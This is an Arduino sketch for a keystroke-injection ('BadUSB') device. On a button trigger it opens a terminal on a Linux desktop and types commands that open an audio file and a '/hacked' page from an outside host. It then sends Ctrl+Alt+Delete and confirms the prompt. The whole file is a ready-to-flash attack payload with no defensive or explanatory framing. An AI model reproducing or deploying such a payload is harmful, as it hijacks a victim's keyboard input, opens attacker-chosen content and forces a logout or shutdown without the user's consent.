#include "Keyboard.h"

// xdg-open http://justgimmefreeser.hostingem.ru/1.mp3
void setup() {
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
}

void loop() {
  delay(1000);
  while (digitalRead(2) == LOW) {
    delay(100);
  }

  Keyboard.write(KEY_LEFT_GUI);
  delay(300);
  Keyboard.print("termi");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(1000);
  Keyboard.print("xdg-open http");
  delay(100);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(':');
  delay(100);
  Keyboard.releaseAll();
  Keyboard.print("//justgimmefreeser.hostingem.ru/1.mp3 ");
  delay(200);

  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('&');
  delay(100);
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('&');
  delay(100);
  Keyboard.releaseAll();

  
  Keyboard.print(" xdg-open http");
  delay(100);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(':');
  delay(100);
  Keyboard.releaseAll();
  Keyboard.print("//justgimmefreeser.hostingem.ru/hacked");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(9000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_DELETE);
  delay(700);
  Keyboard.releaseAll();
  Keyboard.write(KEY_RIGHT_ARROW);
  Keyboard.write(KEY_RETURN);
 
  while (true);
}
